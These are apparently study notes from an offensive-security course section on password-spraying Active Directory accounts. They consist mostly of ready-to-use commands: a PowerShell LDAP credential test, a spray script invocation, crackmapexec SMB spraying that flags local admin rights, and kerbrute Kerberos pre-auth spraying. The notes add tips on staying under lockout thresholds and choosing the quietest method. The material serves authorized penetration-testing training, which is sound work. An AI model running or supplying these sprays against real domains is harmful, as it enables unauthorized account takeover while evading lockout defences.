# 23.2.1 — Password Attacks (Spraying)

- Module: PEN-200 · 23. Attacking Active Directory Authentication
- Source: portal.offsec.com · module `attacking-active-directory-authentication-46102` (§23.2.1)
- Code blocks: 5

> Spray a few common passwords across many users. **Mind the lockout policy first.** Output omitted.

## Check the account/lockout policy

```powershell
net accounts
```

> Note **Lockout threshold** (e.g. 5) and **Lockout observation window** (e.g. 30 min). Stay a
> couple below the threshold, wait out the window. `Minimum password length` etc. also seed wordlists.

## 1) LDAP spray via DirectoryEntry (low-and-slow, native)

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
# 3-arg constructor tests creds: object is created only if the password is correct
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "{{USERNAME}}", "{{PASSWORD}}")
```

Automated version shipped on CLIENT75:

```powershell
.\Spray-Passwords.ps1 -Pass {{PASSWORD}} -Admin      # -File <wordlist> to test many; -Admin includes admin accounts
```

## 2) SMB spray with crackmapexec (Kali) — noisy, but flags local admin

```bash
crackmapexec smb {{TARGET_IP}} -u {{USERLIST}} -p '{{PASSWORD}}' -d {{DOMAIN}} --continue-on-success
crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -d {{DOMAIN}}   # (Pwn3d!) = local admin here
```

> `+`/`-` marks valid/invalid; **`(Pwn3d!)`** means the account is local admin on the target.
> CME does **not** check the password policy — real lockout risk.

## 3) Kerberos pre-auth spray with kerbrute (Win/Linux) — stealthiest

```powershell
.\kerbrute_windows_amd64.exe passwordspray -d {{DOMAIN}} .\usernames.txt "{{PASSWORD}}"
```

> Only 2 UDP frames per try (an AS-REQ + response) → far quieter/faster. **Gotcha:** the username
> file must be **ANSI** encoded or you'll get a network error. Both CME and kerbrute can also
> enumerate valid usernames.
